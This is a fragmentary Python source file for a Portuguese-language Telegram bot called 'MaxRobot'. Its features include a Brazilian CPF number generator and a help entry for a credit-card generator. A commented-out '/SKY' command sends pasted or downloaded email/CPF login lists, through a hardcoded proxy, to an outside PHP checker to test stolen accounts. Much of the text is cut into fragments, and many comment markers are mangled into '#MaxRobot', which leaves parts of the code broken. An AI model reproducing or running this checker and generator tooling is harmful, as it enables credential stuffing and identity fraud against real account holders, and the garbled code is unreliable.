			...
			if(quantidade > 0):
				if(quantidade < 46):
					...
					while(not template == quantidade):
						...
						cpf_novo = f"<b>#MaxRobot{str(template).zfill(len(str(quantidade)))}</b> -> <pre>{cpf}{multi1}{multi2}</pre>"
...
#MaxRobot\n"""
	...
	if(data == "update_nickgen"):
		...
		nicks = f"""<b>01#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>02#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>03#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>04#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>05#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>06#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>07#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>08#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>09#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>10#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>11#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>12#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>13#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>14#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>
<b>15#MaxRobot</b> -> <pre>{gerarNick(nick)}</pre>"""
	...
	if(data=="atualizar_admins"):
		...
		for x in admins_list:
			...
			if(username != "Sem nome de usuário"):
				if(x["user"]["username"] in ["tioFlaviin", "PortalHttp"]):
					status = "🏅 ADMIN, FORNECEDOR"
			
		
			todos_admins += f'<b>{str(count_admins).zfill(2)}#MaxRobot {status}\nNOME:</b> <pre>{x["user"]["first_name"]}</pre> {segundo_nome}\n<b>USUÁRIO:</b> {username}\n\n'
...
<pre>{group_type}</pre>"""
			...
			#MaxRobotbot.deleteMessage(msg["chat"]["id"], reply_to_message_id = msg["message_id"])
	...
	if(ativar == True):
		...
		if(msg["chat"]["type"] == "supergroup" or msg["from"]["id"] in sessao or msg["from"]["id"] in admins):
			try:
				#MaxRobotbot.sendMessage(msg["chat"]["id"], "TESTE")
				bot_response = choice(bot_interage)
				#MaxRobotglobal silenciar
				#MaxRobotif(msg["text"] == "!silenciar"):
				#MaxRobotsilenciar = "sim"
				#MaxRobotbot.sendMessage(msg["chat"]["id"], "SILENCIADO.")
				#MaxRobotreturn True	
				#MaxRobotelif(silenciar == False):
				#MaxRobotbot.sendMessage(msg["chat"]["id"], "NA ESCOLIXO\n\nDE UM !silenciar PARA ESTA MENSAGEM NÃO APARECER MAIS.")
		
		
		
		
				#MaxRobotITERAÇÃO DO BOT
				if(msg["text"].upper() in bot_interage):
					try:
						if(not msg["reply_to_message"]["from"]["id"] == 693860721):
				...
				#MaxRobotSTATUS DOS COMANDOS
				elif(msg["text"].upper() == "/STATUS" or msg["text"].upper() == "/STATUS"):
					bot.sendMessage(msg["chat"]["id"], comandos_online, "html", reply_to_message_id = msg["message_id"])
		
		
		
				#MaxRobotVER LISTA DE COMANDOS
				if(msg["text"].upper() == "/COMANDOS" or msg["text"].upper() == "/COMANDOS"):
					keyboard = InlineKeyboardMarkup(
						inline_keyboard=[
							[InlineKeyboardButton(text='➡️ Próxima Página', callback_data='comandos_proximo')]
						]
				...
				elif(msg["text"].upper() == "/CCGEN" or msg["text"].upper() == "/CCGEN"):
					bot.sendMessage(msg["chat"]["id"], help_ccgen, "html", reply_to_message_id = msg["message_id"])
#MaxRobot				elif(msg["text"].upper() == "/SKY" or msg["text"].upper() == "/SKY"):
#MaxRobot					bot.sendMessage(msg["chat"]["id"], help_sky, "html", reply_to_message_id = msg["message_id"])"""
				elif(msg["text"].upper() == "/PASTE" or msg["text"].upper() == "/PASTE"):
					bot.sendMessage(msg["chat"]["id"], help_paste, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/ML" or msg["text"].upper() == "/ML"):
				...
				#MaxRobotelif(msg["text"].split()[0].upper() == "/PC" and msg["text"].split()[1]):
				#MaxRobotelif(msg["text"].split()[0].upper() == "/CELL" and msg["text"].split()[1]):
				#MaxRobotelif(msg["text"].split()[0].upper() == "/TABLET" and msg["text"].split()[1]):
				...
				elif(msg["text"].upper() == "/REGRA" or msg["text"].upper() == "/REGRAS" or msg["text"].upper() == "/REGRAS"):
					regras = """<b>🔥➡️ Regras ⬅️🔥
...
#MaxRobot				elif(msg["text"].split()[0].upper() == "/SKY" and msg["text"].split()[1]):
#MaxRobot					contas = msg["text"][5:].replace(":", "|")
#MaxRobot					if(msg["text"].split()[1] == "-S"):
#MaxRobot						contas = requests.get(msg["text"].split()[2]).text
#MaxRobot					contas_l = re.compile("[a-zA-Z0-9_.]+@[a-zA-Z0-9_.]+\.[a-zA-Z0-9_.]+.|\d{3}\.?\d{3}\.?\d{3}\.?-?\d{2}").findall(contas)
#MaxRobot					contas = contas.split("\n")
#MaxRobot					count = 0
#MaxRobot					for conta in contas:
#MaxRobot						if(re.compile("[a-zA-Z0-9_.]+@[a-zA-Z0-9_.]+\.[a-zA-Z0-9_.]+.|\d{3}\.?\d{3}\.?\d{3}\.?-?\d{2}").findall(conta)):
#MaxRobot							proxy = "206.189.171.31:3128"
#MaxRobot							count += 1
#MaxRobot							msg_bot = bot.sendMessage(msg["chat"]["id"], f'<b>.. [{count}/{len(contas_l)}]</b>', "html", reply_to_message_id = msg["message_id"])
#MaxRobot							url = "http://tabuadafree.000webhostapp.com/chk__sky.php"
#MaxRobot							r = html.escape(requests.get(url, params={"info":conta, "p":proxy}).text)
#MaxRobot							if(r.count("""414 Request-URI Too Long:""")):
#MaxRobot								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>Não foi possivel testar os logins. Para você obter exito, dê quebras de linhas para mim poder processar.</b>", parse_mode="html")
#MaxRobot								break
#MaxRobot							keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='💣', callback_data='chkgen')]])
#MaxRobot							if(r.count("Teste Novamente")):
#MaxRobot								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>{r}\n\nPROXY: {proxy}</b>", parse_mode="html", reply_markup=keyboard)
#MaxRobot							else:
#MaxRobot								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>{r}</b>", parse_mode="html", reply_markup=keyboard)
...
<b>FONTE:</b> <pre>http://pt.wikipedia.org/wiki/</pre>"""
					...
					try:
						...
						pass
						#MaxRobotlink_serie = first_serie.a["href"]
						#MaxRobotr_serie = requests.get(link_serie).text
						#MaxRobotsource_serie = bs(r_serie, "html.parser")
						#MaxRobottempo_serie = source_serie.find("span", {"class":"tempo-video"}).text
						#MaxRobotlancamento_serie = source_serie.find("span", {"class":"lancamento-video"}).text
						#MaxRobotnome_serie = source_serie.find("span", {"class":"last-bread"}).text
						#MaxRobottry:
						#MaxRobot	emissora_serie = source_serie.find("span", {"class":"emissora-video"}).text
						#MaxRobotexcept:
						#MaxRobot	emissora_serie = ""
						#MaxRobotaudio_serie = source_serie.find("span", {"class":"audio-video"}).text
						#MaxRobotsinopse_serie = source_serie.find_all("p")[1].text
						#MaxRobotc_temp_serie = len(source_serie.find("ul", {"class":"tabs"}).find_all("li"))
						#MaxRobotif(emissora_serie == ""):
						#MaxRobot	dados_serie = f"""<b>💭 NOME DA SÉRIE:</b>
#MaxRobot<pre>{nome_serie}</pre>
							
#MaxRobot<b>⏰ Tempo dos episódios</b>
#MaxRobot<pre>{tempo_serie.split()[1]}</pre>
							
#MaxRobot<b>🗓 Lançado em:</b>
#MaxRobot<pre>{lancamento_serie.split()[1]}</pre>
							
#MaxRobot<b>❇️ Emissora:</b>
#MaxRobot<pre>Nenhuma</pre>
							
#MaxRobot<b>🔉 {audio_serie.split()[0]}</b>
#MaxRobot<pre>{" ".join(map(str, audio_serie.split()[1:]))}</pre>
						
#MaxRobot<b>✳️ TOTAL DE TEMPORADAS:</b>
#MaxRobot<pre>{c_temp_serie}</pre>

#MaxRobot<b>Sinopse:</b>
#MaxRobot<pre>{sinopse_serie}</pre>

#MaxRobot<b>ASSISTA A SÉRIE CLICANDO</b> <a href="{link_serie}">AQUI</a>"""
#MaxRobot						else:	
#MaxRobot							dados_serie = f"""<b>💭 NOME DA SÉRIE:</b>
#MaxRobot<pre>{nome_serie}</pre>
							
#MaxRobot<b>⏰ {tempo_serie.split()[0]}</b>
#MaxRobot<pre>{tempo_serie.split()[1]}</pre>
						
#MaxRobot<b>🗓 {lancamento_serie.split()[0]}</b>
#MaxRobot<pre>{lancamento_serie.split()[1]}</pre>

#MaxRobot<b>❇️ {emissora_serie.split()[0]}</b>
#MaxRobot<pre>{" ".join(map(str, emissora_serie.split()[1::]))}</pre>
...
#MaxRobot<b>ASSISTA A SÉRIE CLICANDO</b> <a href="{link_serie}">AQUI</a>"""
#MaxRobot						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados_serie, parse_mode="html", disable_web_page_preview = True)
#MaxRobot					except:
#MaxRobot						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text="<b>Série não encontrada!</b>", parse_mode="html")
...
"""
				...
				#MaxRobotelif(msg["text"]):
					#MaxRobotbot.forwardMessage(msg["chat"]["id"], "@InternetFreeOfc", msg["message_id"])
